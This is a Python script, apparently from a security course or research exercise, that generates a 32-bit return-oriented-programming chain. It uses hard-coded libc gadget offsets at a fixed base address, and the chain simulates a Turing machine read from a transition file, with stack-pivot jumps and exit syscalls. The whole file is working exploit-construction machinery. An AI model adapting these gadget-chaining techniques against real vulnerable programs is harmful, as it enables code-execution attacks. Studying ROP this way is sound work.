import sys

class ROP:
    def __init__(self):
        self.arr = bytearray()

    def xchg_w_eax(self, reg):
        if (reg == "ebp"):
            self.arr += (0x0002d455 + 0xb7dec000).to_bytes(4, byteorder='little')
        if (reg == "ebx"):
            self.arr += (0x000f99df + 0xb7dec000).to_bytes(4, byteorder='little')
        if (reg == "ecx"):
            #TRASHES ECX: xchg eax, ecx ; and al, 0x5b ; ret
            self.arr += (0x0002664e + 0xb7dec000).to_bytes(4, byteorder='little')
        if (reg == "edi"):
            self.arr += (0x00020a3d + 0xb7dec000).to_bytes(4, byteorder='little')
        if (reg == "edx"):
            self.arr += (0x00041702 + 0xb7dec000).to_bytes(4, byteorder='little')
        if (reg == "esi"):
            self.arr += (0x0001b286 + 0xb7dec000).to_bytes(4, byteorder='little')
        if (reg == "esp"):
            self.arr += (0x0001b269 + 0xb7dec000).to_bytes(4, byteorder='little')

    def swp_regs(self, reg1, reg2):
        self.xchg_w_eax(reg1)
        self.xchg_w_eax(reg2)
        self.xchg_w_eax(reg1)

    def zero_out_reg(self, reg):
        if(reg == "eax"):
            self.arr += (0x0002ff9f + 0xb7dec000).to_bytes(4, byteorder='little')
        else: 
            self.xchg_w_eax(reg)
            self.zero_out_reg("eax")
            self.xchg_w_eax(reg)

    def pop_register(self, reg, num):
        if(reg == "eax"):
            self.arr += (0x00026687 + 0xb7dec000).to_bytes(4, byteorder='little')
        if(reg == "ebp"):
            self.arr += (0x0001a4cc + 0xb7dec000).to_bytes(4, byteorder='little')
        if(reg == "ebx"):
            self.arr += (0x0001a8b5 + 0xb7dec000).to_bytes(4, byteorder='little')
        if(reg == "edi"):
            self.arr += (0x00019173 + 0xb7dec000).to_bytes(4, byteorder='little')
        if(reg == "edx"):
            self.arr += (0x0002effc + 0xb7dec000).to_bytes(4, byteorder='little')
        if(reg == "esi"):
            self.arr += (0x0001bf2c + 0xb7dec000).to_bytes(4, byteorder='little')
        if(reg == "esp"):
            self.arr += (0x001236b0 + 0xb7dec000).to_bytes(4, byteorder='little')
        if (reg == "ecx"):
            self.xchg_w_eax("ecx")
            self.pop_register("eax", 0)
            self.arr += (num).to_bytes(4, byteorder='little')
            self.xchg_w_eax("ecx")

    def initialize_head_state(self):
        # initialize head
        self.swp_regs("edx", "ecx")
        
    def write_head(self, num):
        self.zero_out_reg("esi")
        self.pop_register("esi", 0)
        self.arr += (ord(num)).to_bytes(4, byteorder='little')                      #push byte that we want to write into esi   
        self.swp_regs("edx", "ecx")
        self.pop_register("edi", 0)
        self.arr += (0xFFFFFF00).to_bytes(4, byteorder='little')
        self.arr += (0x00086d0f + 0xb7dec000).to_bytes(4, byteorder='little')       #0x00086d0f : and dword ptr [ecx], edi ; ret
        self.swp_regs("esi", "edi")
        self.arr += (0x00040a30 + 0xb7dec000).to_bytes(4, byteorder='little')       #0x00040a30 : add dword ptr [ecx], edi ; ret
        self.swp_regs("edx", "ecx")
    
    def read_head(self):
        self.xchg_w_eax("edi")
        self.arr += (0x0006a227 + 0xb7dec000).to_bytes(4, byteorder='little')       #0x0006a227 : mov eax, dword ptr [edx] ; ret
        self.xchg_w_eax("esi")
        self.pop_register("ecx", 0x000000FF)
        self.xchg_w_eax("esi")
        self.arr += (0x0002d87e + 0xb7dec000).to_bytes(4, byteorder='little')       #0x0002d87e : and eax, ecx ; ret
        self.xchg_w_eax("ebx")
        self.swp_regs("edi", "ecx")
        self.pop_register("eax", 0)
        self.arr += (0xFFFFFF00).to_bytes(4, byteorder='little')
        self.arr += (0x0002d87e + 0xb7dec000).to_bytes(4, byteorder='little')       #0x0002d87e : and eax, ecx ; ret
        self.swp_regs("ebx", "ebp")
        self.arr += (0x00077ae7 + 0xb7dec000).to_bytes(4, byteorder='little')       #0x00077ae7 : add eax, ebp ; ret

    def move_head_left(self):
        # move edx into eax, decrement eax, move it back
        self.arr += (0x00088f34 + 0xb7dec000).to_bytes(4, byteorder='little')
        self.arr += (0x0007bc64 + 0xb7dec000).to_bytes(4, byteorder='little')
        self.arr += (0x00121c7d + 0xb7dec000).to_bytes(4, byteorder='little')

    def move_head_right(self):
        #NOTE: BALANCED WITH MOVE_HEAD_LEFT W RET -> CHECK!!!
        self.arr += (0x0002d654 + 0xb7dec000).to_bytes(4, byteorder='little')
        self.arr += (0x0001a8bf + 0xb7dec000).to_bytes(4, byteorder='little')
        self.arr += (0x0001a8bf + 0xb7dec000).to_bytes(4, byteorder='little')
        self.arr += (0x000190f1 + 0xb7dec000).to_bytes(4, byteorder='little')

    def increment_reg(self, reg):
        if(reg == "eax"):
            self.arr += (0x000270ea + 0xb7dec000).to_bytes(4, byteorder='little')
        if(reg == "ebp"):
            self.arr += (0x00035832 + 0xb7dec000).to_bytes(4, byteorder='little')
        if (reg == "ebx"):
            self.arr += (0x0002d216 + 0xb7dec000).to_bytes(4, byteorder='little')
        if(reg == "edx"):
            self.arr += (0x0002d654 + 0xb7dec000).to_bytes(4, byteorder='little')
        if(reg == "esi"):
            self.arr += (0x000651a6 + 0xb7dec000).to_bytes(4, byteorder='little')
        if(reg == "esp"):
            self.arr += (0x00020668 + 0xb7dec000).to_bytes(4, byteorder='little')
        if(reg == "ecx"): # NOTE: will trash ebx; 0x000d3f2b : inc ecx ; add al, 0x89 ; ret
            self.xchg_w_eax("ebx")
            self.arr += (0x000d3f2b + 0xb7dec000).to_bytes(4, byteorder='little')
            self.xchg_w_eax("ebx")

    def decrement_reg(self, reg):
        if(reg == "eax"):
            self.arr += (0x0007bc64 + 0xb7dec000).to_bytes(4, byteorder='little')
        if(reg == "ebp"):
            self.arr += (0x0004c892 + 0xb7dec000).to_bytes(4, byteorder='little')
        if(reg == "ecx"):
            self.arr += (0x0001e6f2 + 0xb7dec000).to_bytes(4, byteorder='little')
        if(reg == "edi"):
            self.arr += (0x000472d4 + 0xb7dec000).to_bytes(4, byteorder='little')
        if(reg == "esi"):
            self.arr += (0x0005118a + 0xb7dec000).to_bytes(4, byteorder='little')
        if(reg == "esp"):
            self.arr += (0x000ea6c7 + 0xb7dec000).to_bytes(4, byteorder='little')

    def negate_reg(self, reg): 
        # negates a value by finding 2's complement of its single operand
        # NEG AFFECTS FLAGS
        if(reg == "eax"):
            self.arr += (0x000654b0 + 0xb7dec000).to_bytes(4, byteorder='little')
        if(reg == "edx"):
            self.arr += (0x0001b0ac + 0xb7dec000).to_bytes(4, byteorder='little')

    def and_eax_register(self, reg):
        if(reg == "ecx"):
            self.arr += (0x0002d87e + 0xb7dec000).to_bytes(4, byteorder='little')
        if(reg == "edx"):
           self.arr += (0x0002df2e + 0xb7dec000).to_bytes(4, byteorder='little')

    def jump(self):
        self.swp_regs("edx", "edi")
        self.arr += (0x00121c7d + 0xb7dec000).to_bytes(4, byteorder='little')   # 0x00121c7d : mov edx, eax ; mov eax, edx ; ret
        self.swp_regs("edx", "edi")
        self.arr += (0x00150e98 + 0xb7dec000).to_bytes(4, byteorder='little')   #sub eax, ecx ; ret
        self.arr += (0x000654b0 + 0xb7dec000).to_bytes(4, byteorder='little')   # neg eax ; ret
        self.zero_out_reg("esi")
        self.arr += (0x0007773c + 0xb7dec000).to_bytes(4, byteorder='little')   # add with carry (adc reg, reg) ; ret
        self.xchg_w_eax("esi")
        self.negate_reg("eax")
        self.swp_regs("esi", "edx")     #save edx (head) in esi, bc need to use edx for esp_delta
        # now: esi has edx value, AKA head; edi has eax AKA input symbol

        self.pop_register("edx", 0)
        self.arr += (64).to_bytes(4, byteorder='little')
        self.and_eax_register("edx")    # and eax, edx (esp_delta)

        self.increment_reg("ecx")       #increment counter before jump

        #jump
        self.xchg_w_eax("edx")
        self.pop_register("eax", 0)
        self.arr += (0x37800000 + len(self.arr) + 28).to_bytes(4, byteorder='little')
        self.arr += (0x000f4834 + 0xb7dec000).to_bytes(4, byteorder='little')       # 0x000f4834 : mov dword ptr [eax], edx ; ret 
        self.pop_register("edx", 0)
        self.arr += (8).to_bytes(4, byteorder='little')
        self.arr += (0x00098fec + 0xb7dec000).to_bytes(4, byteorder='little')       #add dword ptr [eax], edx ; ret
        self.arr += (0x00098ffc + 0xb7dec000).to_bytes(4, byteorder='little')       # 0x00098ffc : add dword ptr [eax], esp ; ret
        self.pop_register("esp", 0)
        self.arr += (0xdecafbad).to_bytes(4, byteorder='little')                    #to be overwritten by [eax]

    def helper(self, scan, length):
        self.read_head()                # will store input symbol in eax 
        self.zero_out_reg("ecx")        # zero out ecx for counter;

        for i in range(0, length):
            self.jump()
            # restore registers: esi to edx, edi to eax
            self.xchg_w_eax("edi")
            self.swp_regs("esi", "edx")

            output = scan.readline()
            outputArr = output.split(" ")
            self.write_head(outputArr[3])
            # check for accept/reject state. else, call helper again
            if (outputArr[2] == 'r'):
                self.pop_register("eax", 0)
                self.arr += (0x00000001).to_bytes(4, byteorder='little')
                self.pop_register("ebx", 0)
                self.arr += (0x00000001).to_bytes(4, byteorder='little')
                self.arr += (0xb7eacc5a).to_bytes(4, byteorder='little')
            
            elif (outputArr[2] == 'a'):
                self.pop_register("eax", 0)
                self.arr += (0x00000001).to_bytes(4, byteorder='little')
                self.pop_register("ebx", 0)
                self.arr += (0x00000000).to_bytes(4, byteorder='little')
                self.arr += (0xb7eacc5a).to_bytes(4, byteorder='little')

            else:
                self.zero_out_reg("ecx")   
                self.pop_register("eax", 0)
                self.arr += (ord(outputArr[2])).to_bytes(4, byteorder='little')
                self.arr += (0x0006ea87 + 0xb7dec000).to_bytes(4, byteorder='little')           #or ch, al ; ret
                #at this point, the new state is in ch, need to move to ah, al is 0
                self.xchg_w_eax("ecx")
                #check direction
                if(outputArr[4] == 'R'):
                    self.move_head_right()
                else:
                    self.move_head_left()

    def main(self, filename):
        #COUNTER: ECX
        self.initialize_head_state()
        self.zero_out_reg("eax")
        input_ = open(filename, 'r')
        inputLines = input_.readlines()
        length = len(inputLines)
        input_.close()
        scan = open(filename, 'r')
        self.helper(scan, length)
        sys.stdout.buffer.write(self.arr)
a = ROP()
a.main(sys.argv[1])


            
            

